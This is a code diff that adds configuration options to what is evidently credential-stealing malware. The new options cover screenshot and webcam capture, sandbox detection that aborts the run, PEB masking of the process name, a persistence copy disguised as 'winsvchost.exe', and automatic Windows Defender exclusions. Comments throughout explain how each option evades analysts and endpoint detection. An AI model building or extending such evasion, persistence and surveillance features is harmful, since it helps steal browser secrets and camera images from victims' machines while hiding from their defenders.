@@ -49,6 +49,16 @@ MAX_VERSION_TEXT: Final[int] = 256
 MAX_DECOY_SECONDS: Final[int] = 600
 MAX_DECOY_TEXT: Final[int] = 512
 
+# A staged image name is a filename, not a path: separators are rejected by the reader
+# so a config cannot aim the persistence copy at an arbitrary directory.
+MAX_IMAGE_NAME: Final[int] = 64
+
+# A week is the ceiling for a resumable state file. Past that the machine state that
+# produced it has moved on, and resuming it would splice two different runs together.
+MAX_STATE_HOURS: Final[int] = 168
+
+ANTI_ANALYSIS_MODES: Final[tuple[str, ...]] = ("abort", "warn", "off")
+
 
 class ConfigError(ValueError):
     """Raised for any config that does not match the schema.
@@ -107,6 +117,10 @@ class SourceConfig:
     sessions: bool = True
     system: bool = True
     browsers: bool = True
+    # Screenshots and one webcam frame. On by default because the payload is small and
+    # the two files answer "what was this machine doing" better than any JSON; every
+    # failure inside the group is soft and recorded, never raised.
+    visual: bool = True
 
 
 @dataclass(frozen=True, slots=True)
@@ -157,6 +171,26 @@ class RunConfig:
     decoy_seconds: int = 0
     decoy_title: str = ""
     decoy_text: str = ""
+    # The whole profile folder beside the parsed JSON. Off by default: the stores that
+    # hold the secrets are copied either way, and a raw bundle of four browsers was 319 MB
+    # of extension files on the machine this was measured against.
+    raw_bundle: bool = False
+    # ``abort`` exits before decryption when the machine looks like an analysis box,
+    # ``warn`` records the hit and continues, ``off`` skips the check.
+    anti_analysis: str = "abort"
+    # A frame that is one flat colour on one small monitor is a sandbox tell. With this
+    # on, the run stops before sealing and before any request rather than shipping it.
+    abort_on_uniform_capture: bool = True
+    # Rewrite the process image name and command line in the PEB at start. Cosmetic to a
+    # process list and visible to an EDR that compares the PEB against the file.
+    mask_peb: bool = True
+    # The name the staged copy takes in the persistence folder.
+    image_name: str = "winsvchost.exe"
+    # Add the install directory and image to Defender's exclusions on the first returning
+    # boot. Attempt-and-record: a Tamper-Protected host refuses and the run continues.
+    defender_exclusion: bool = True
+    # How long a half-finished state file stays resumable, in hours.
+    state_hours: int = 6
 
 
 def _names(cls: type) -> tuple[str, ...]:
@@ -218,6 +252,24 @@ def _as_nonempty_str(value: Any, path: str) -> str:
     text = _as_str(value, path)
     if not text.strip():
         raise ConfigError(path, "must not be empty")
+    return text
+
+
+def _as_choice(value: Any, path: str, allowed: tuple[str, ...]) -> str:
+    text = _as_str(value, path)
+    if text not in allowed:
+        raise ConfigError(path, f"expected one of {', '.join(allowed)}, got {text!r}")
+    return text
+
+
+def _image_name(value: Any, path: str) -> str:
+    text = _as_str(value, path)
+    if not text.strip():
+        raise ConfigError(path, "must not be empty")
+    if len(text) > MAX_IMAGE_NAME:
+        raise ConfigError(path, f"expected at most {MAX_IMAGE_NAME} characters, got {len(text)}")
+    if any(character in text for character in '\\/:*?"<>|'):
+        raise ConfigError(path, "must be a filename, not a path")
     return text
 
 
@@ -374,6 +426,35 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
     decoy_text = (
         _decoy_text(document["decoy_text"], "decoy_text") if "decoy_text" in document else ""
     )
+    raw_bundle = (
+        _as_bool(document["raw_bundle"], "raw_bundle") if "raw_bundle" in document else False
+    )
+    anti_analysis = (
+        _as_choice(document["anti_analysis"], "anti_analysis", ANTI_ANALYSIS_MODES)
+        if "anti_analysis" in document
+        else "abort"
+    )
+    abort_on_uniform_capture = (
+        _as_bool(document["abort_on_uniform_capture"], "abort_on_uniform_capture")
+        if "abort_on_uniform_capture" in document
+        else True
+    )
+    mask_peb = _as_bool(document["mask_peb"], "mask_peb") if "mask_peb" in document else True
+    image_name = (
+        _image_name(document["image_name"], "image_name")
+        if "image_name" in document
+        else "winsvchost.exe"
+    )
+    defender_exclusion = (
+        _as_bool(document["defender_exclusion"], "defender_exclusion")
+        if "defender_exclusion" in document
+        else True
+    )
+    state_hours = (
+        _as_int_in(document["state_hours"], "state_hours", 0, MAX_STATE_HOURS)
+        if "state_hours" in document
+        else 6
+    )
 
     return RunConfig(
         schema_version=version,
@@ -390,6 +471,13 @@ def from_dict(data: Mapping[str, Any]) -> RunConfig:
         decoy_seconds=decoy_seconds,
         decoy_title=decoy_title,
         decoy_text=decoy_text,
+        raw_bundle=raw_bundle,
+        anti_analysis=anti_analysis,
+        abort_on_uniform_capture=abort_on_uniform_capture,
+        mask_peb=mask_peb,
+        image_name=image_name,
+        defender_exclusion=defender_exclusion,
+        state_hours=state_hours,
     )
 
 
@@ -417,6 +505,13 @@ def to_dict(cfg: RunConfig) -> dict[str, Any]:
         "decoy_seconds": cfg.decoy_seconds,
         "decoy_title": cfg.decoy_title,
         "decoy_text": cfg.decoy_text,
+        "raw_bundle": cfg.raw_bundle,
+        "anti_analysis": cfg.anti_analysis,
+        "abort_on_uniform_capture": cfg.abort_on_uniform_capture,
+        "mask_peb": cfg.mask_peb,
+        "image_name": cfg.image_name,
+        "defender_exclusion": cfg.defender_exclusion,
+        "state_hours": cfg.state_hours,
         "relay": {
             "kind": cfg.relay.kind,
             "endpoint": cfg.relay.endpoint,
@@ -432,9 +527,12 @@ def to_dict(cfg: RunConfig) -> dict[str, Any]:
 
 
 __all__ = [
+    "ANTI_ANALYSIS_MODES",
     "MAX_BALLAST_MB",
+    "MAX_IMAGE_NAME",
     "MAX_PERSIST_HOURS",
     "MAX_RELAY_TARGETS",
+    "MAX_STATE_HOURS",
     "RELAY_FIELDS",
     "RELAY_KINDS",
     "RUN_FIELDS",
